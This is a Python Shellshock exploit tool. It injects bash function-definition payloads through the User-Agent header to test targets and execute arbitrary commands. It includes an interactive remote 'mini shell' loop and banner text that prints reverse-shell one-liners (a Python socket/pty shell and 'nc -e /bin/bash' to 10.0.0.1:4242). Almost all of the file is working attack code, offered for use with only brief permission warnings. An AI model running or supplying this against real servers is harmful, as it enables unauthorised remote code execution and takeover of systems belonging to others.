import requests
import argparse
import cowsay
import random
from time import sleep
from colorama import Fore

parse = argparse.ArgumentParser()

parse.add_argument('-u', '--url', required=True,
                   help='URL TARGET: https:exemple.com.br/')
parse.add_argument('-c', '--command', help='Request content body')

args = parse.parse_args()


def banner():
    phrases = [
        "SHOCK IN YOUR SISTEM",
        "TRY >>> python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'",
        "Do not use this in government institutions or organizations in which you are not allowed!!!",
        "TRY: >>> nc -e /bin/bash 10.0.0.1 4242"
        "I'm a very technological cow",
        "WARNING: Careful, don't use this without permission!"
    ]
    random_number = random.randint(0, 4)
    cowsay.cow(phrases[random_number])
    print("v0.1 ====== Created by Az4ar\n")
    sleep(2)


def isVulnerable(url):
    payload = {
        "User-Agent": "() { :; };echo; /bin/echo 'Hello World'"
    }
    res = requests.get(url, headers=payload)
    exploitable = ''

    if "Hello World" in res.text:
        exploitable = True
    else:
        print("\n[+] The target does not appear to be vulnerable\n")
        exploitable = False

    return exploitable


def stop_app():
    print("\n:: App Aborted!\n")
    exit(1)


def exploit(url, cmd):
    response_title = "============ RESPONSE ============"

    if not isVulnerable(url):
        exit(1)
    try:
        banner()
        if (cmd == None):
            cmd = "uname -a && id && pwd"
        payload = {
            "User-Agent": "() { :echo; };echo; /bin/bash -c " + f"'{cmd}'"
        }

        res = requests.get(url, headers=payload)
        print(response_title)
        print("\n" + res.text)

        # Mini SHELL
        openMiniShell = str(input("\nOpen a mini shell? (Y/n): "))
        if (openMiniShell == "Y" or openMiniShell == "Yes" or openMiniShell == "yes" or openMiniShell == ""):
            sleep(1)
            print("\nWARNING: Careful, don't use this without permission!")
            sleep(1)
            print(
                "\n[+] This is just a limited version of a linux-based shell! For something more complete try a reverse shell\n")
            sleep(1)
            while True:
                command = input(Fore.CYAN + "(localhost@localhost)~$ ")
                payload = {
                    "User-Agent": "() { :echo; };echo; /bin/bash -c " + f"'{command}'"
                }
                try:
                    res = requests.get(url, headers=payload)
                    print("\n"+ Fore.MAGENTA + res.text)
                except KeyboardInterrupt:
                    stop_app()
    except KeyboardInterrupt:
        stop_app()


exploit(args.url, args.command)
